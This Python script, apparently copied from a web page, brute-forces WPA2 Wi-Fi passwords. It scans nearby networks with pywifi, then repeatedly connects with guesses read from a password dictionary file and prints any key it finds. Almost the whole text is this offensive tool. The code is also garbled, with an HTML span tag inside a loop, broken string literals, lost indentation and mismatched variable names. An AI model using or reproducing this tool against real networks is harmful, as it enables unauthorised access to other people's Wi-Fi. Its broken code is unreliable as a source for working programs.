#Violently crack passwords, take a long time GetWifiPsd.py

import pywifi

from pywifi import const  #Refer to some definitions

import time

def getwifi(wifilist, wificount):
    wifi = pywifi.PyWiFi()  #Grab the NIC interface
    ifaces = wifi.interfaces()[0]  #Get NIC
    ifaces.scan()
    time.sleep(8)
    bessis = ifaces.scan_results()
    allwifilist = []
    namelist = []
    ssidlist = []
    for data in bessis:
        if data.ssid not in namelist:  #Remove Duplicate WIFI name
            namelist.append(data.ssid)
            allwifilist.append((data.ssid, data.signal))
            sorted(allwifilist, key=lambda st: st[1], reverse =True)
            time.sleep(1)
            n = 0
        if len(allwifilist) is not 0:
            for item in allwifilist:
                if (item[0] not in ssidlist) & (item[0] not in wifilist):
                    n = n + 1
                if n <= wificount:
                    ssidlist.append(item[0])
                    print(allwifilist)
    return ssidlist

def getifaces():
    wifi = pywifi.PyWiFi()  #Grab the NIC interface
    ifaces = wifi.interfaces()[0]  #Get NIC
    ifaces.disconnect()  #Disconnect Unlimited NIC connection
    return ifaces

def testwifi(ifaces, ssidname, password ):
    profile = pywifi.Profile() #Create a wifi connection file
    profile.ssid = ssidname  #Define wifissid
    profile.auth = const.AUTH_ALG_OPEN  #NIC Open
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  #wifi encryption algorithm
    profile.cipher = const.CIPHER_TYPE_CCMP  #Encryption Unit
    profile.key = password  #wifi password
    ifaces.remove_all_network_profiles()  #Delete all others Configuration file
    tmp_profile = ifaces.add_network_profile(profile)  #Load configuration file
    ifaces.connect(tmp_profile)  #Connect wifi 
    time.sleep(5)  #5 seconds Can it be connected?
    if ifaces.status() == const.IFACE_CONNECTED:
        return True
    else:
        return False

def beginwork(wifinamelist):
    ifaces = getifaces()
    path = r" Password-8 digits.txt"
    path = r"password-common password.txt"
    files = open(path, 'r ')
    while True:
        try:
            password = files.readline()
            password = password.strip('\
            ')
            if not password:
                break
            for wifiname in"<Span style=" color: 000000;">" wifinamelist:
                print("Trying:" + wifiname + "," + Password)
            if testwifi(ifaces , wifiname, password):
                print("Wifi Account:" + wifiname + ", Wifi Password:"" + password)
                wifinamelist.remove(wifiname)
                break
            if not wifinamelist:
                break
        except:
            continue
    files.close()


if __name__ == '__main__':
wifinames_e = ["", "Vrapile"]  Exclude unkilled wifi names
wifinames = getwifi(wifinames_e, 5)
print(wifinames)
beginwork(wifinames)
